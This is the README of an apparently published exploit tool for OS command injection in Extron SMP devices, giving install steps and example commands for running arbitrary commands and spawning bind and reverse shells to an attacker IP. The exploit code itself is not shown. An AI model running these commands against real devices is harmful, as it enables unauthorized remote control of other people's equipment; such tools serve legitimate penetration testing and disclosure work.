# Extron SMP OS Command Injection

By Ryan Roth [@f1rstm4tter](https://twitter.com/f1rstm4tter)
[www.layer8security.com](http://www.layer8security.com)

## Overview

This tool exploits OS command injection vulnerabilities in Extron SMP devices. It allows users to execute arbitrary commands and spawn shells (both bind and reverse) on the target system.

## Table of Contents

- [Installation](#installation)
- [Usage](#usage)
- [Arguments](#arguments)
- [Examples](#examples)
- [Logging](#logging)
- [License](#license)

## Installation

To use this tool, you need Python 3.x and `pip` installed. Clone the repository and install the required packages:

```bash
git clone https://github.com/yourusername/extron-smp-command-injection.git
cd extron-smp-command-injection
pip install requests
```

## Usage

To run the tool, use the following command:

```bash
python main.py <action> [options]
```

### Arguments

- `action`: The action to perform (either `command`, `bind`, or `reverse`).
- `rhost`: The target IP address (required).
- `rport`: The target port (80 or 443) (required).
- `--username`: The username for authentication (default: `admin`).
- `--password`: The password for authentication.
- `-v` or `--verbose`: Enable verbose logging.
- `--log-file`: Specify a log file to write logs to.

### Examples

**Execute an arbitrary command:**

```bash
python main.py command <target_ip> <target_port> --username admin --password <password> "ls -la"
```

**Spawn a bind shell:**

```bash
python main.py bind <target_ip> <target_port> <local_port> --username admin --password <password>
```

**Spawn a reverse shell:**

```bash
python main.py reverse <target_ip> <target_port> <attacker_ip> <attacker_port> --username admin --password <password>
```

## Logging

The tool supports logging output to the console and optionally to a file. You can enable verbose logging using the `-v` option, which provides more detailed output during execution.


## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Disclaimer

Ensure you have proper authorization before testing devices. Unauthorized access is illegal.
